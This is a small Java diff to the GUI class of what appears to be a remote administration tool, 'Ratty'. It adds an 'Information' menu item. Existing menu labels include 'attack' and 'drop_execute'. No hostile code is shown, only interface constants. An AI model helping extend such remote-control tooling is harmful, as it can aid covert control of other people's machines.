@@ -93,6 +93,7 @@ public final class RattyGui extends AbstractListenerContainer<IGuiController> im
 	public static final String ATTACK = LANGUAGE.getString("action.attack");
 	public static final String DROP_EXECUTE = LANGUAGE.getString("action.drop_execute");
 	public static final String CHAT = LANGUAGE.getString("action.chat");
+	public static final String INFORMATION = LANGUAGE.getString("action.information");
 	public static final String CLOSE = "Close";
 	
 	static {
@@ -108,6 +109,7 @@ public final class RattyGui extends AbstractListenerContainer<IGuiController> im
 		UTILITY_ITEM_DATA.put(WEBSITE, MENU_ICONS[8]);
 		UTILITY_ITEM_DATA.put(AUDIO, MENU_ICONS[7]);
 		UTILITY_ITEM_DATA.put(CHAT, MENU_ICONS[12]);
+		OTHER_ITEM_DATA.put(INFORMATION, MENU_ICONS[13]);
 		OTHER_ITEM_DATA.put(FREE, MENU_ICONS[10]);
 	}
 	
